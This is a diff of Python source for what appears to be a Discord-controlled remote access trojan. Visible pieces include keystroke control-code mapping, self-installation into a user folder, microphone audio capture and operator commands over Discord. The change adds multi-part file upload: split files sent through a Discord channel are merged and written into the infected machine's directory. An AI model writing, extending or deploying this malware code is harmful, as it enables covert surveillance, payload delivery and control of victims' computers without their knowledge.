@@ -59,7 +59,7 @@ client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
-files_to_merge, expectation, one_file_attachment_message = [], None, None
+files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 working_directory = sys.argv[0].split('\\')[:-1]
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -149,8 +149,29 @@ async def on_reaction_add(reaction, user):
                         async for message in reaction.message.channel.history(limit=2):
                             await message.delete()
                         await reaction.message.channel.send('```Uploaded  ' + filename + '  into  ' + '/'.join(working_directory) + '/' + filename + '```')
+                        expectation = None
+
                     elif expectation == 'multiplefiles':
-                        asd
+                        try: os.mkdir('temp')
+                        except: rmtree('temp'); os.mkdir('temp')
+
+                        await files_to_merge[0][-1].edit(content='```Uploading file 1 of ' + str(len(files_to_merge[1])) + '```')
+                        for i in range(len(files_to_merge[1])):
+                            split_v1 = str(files_to_merge[1][i].attachments).split("filename='")[1]
+                            filename = str(split_v1).split("' ")[0]
+                            await files_to_merge[1][i].attachments[0].save(fp='temp/' + filename)
+                            await files_to_merge[0][-1].edit(content='```Uploading file ' + str(i+1) + ' of ' + str(len(files_to_merge[1])) + '```')
+                        await files_to_merge[0][-1].edit(content='```Uploading completed```')
+                        for i in os.listdir('temp'):
+                            if i != 'manifest':
+                                os.rename('temp/' + i, 'temp/' + i[:-8])
+                        Merge('temp', '/'.join(working_directory), files_to_merge[2]).merge(cleanup=True)
+                        rmtree('temp')
+                        async for message in client.get_channel(channel_ids['file']).history():
+                            await message.delete()
+                        await reaction.message.channel.send('```Uploaded  ' + files_to_merge[2] + '  into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '```')
+                        files_to_merge = [[], [], []]
+                        expectation = None
                     
         except: pass
 
@@ -302,12 +323,23 @@ async def on_message(message):
             await message.delete()
             if message.channel.id == channel_ids['file']:
                 if message.content == '.upload':
-                    reaction_msg = await message.channel.send('```Syntax: .upload <type>\nTypes:\n    single - upload one file with size less than 8MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 8MB```'); await reaction_msg.add_reaction('🔴')
+                    reaction_msg = await message.channel.send('```Syntax: .upload <type> [name]\nTypes:\n    single - upload one file with size less than 8MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 8MB```'); await reaction_msg.add_reaction('🔴')
                 else:
                     if message.content[8:] == 'single':
                         expectation = 'onefile'
+                    if message.content[8:16] == 'multiple' and len(message.content) > 17:
+                        expectation = 'multiplefiles'
+                        files_to_merge[2] = message.content[17:]
+                        files_to_merge[0].append(await message.channel.send('```Please send here all files (one-by-one) prepared by Splitter and then type  .done```'))
+                    else: reaction_msg = await message.channel.send('```Syntax: .upload multiple <name>```'); await reaction_msg.add_reaction('🔴')
             else:
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content == '.done':
+            if expectation == 'multiplefiles':
+                files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
+                await files_to_merge[0][-1].add_reaction('📤')
+                await files_to_merge[0][-1].add_reaction('🔴')
 
         elif expectation == 'onefile':
             split_v1 = str(message.attachments).split("filename='")[1]
@@ -318,7 +350,7 @@ async def on_message(message):
             one_file_attachment_message = message
 
         elif expectation == 'multiplefiles':
-            files_to_merge.append(message)
+            files_to_merge[1].append(message)
 
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
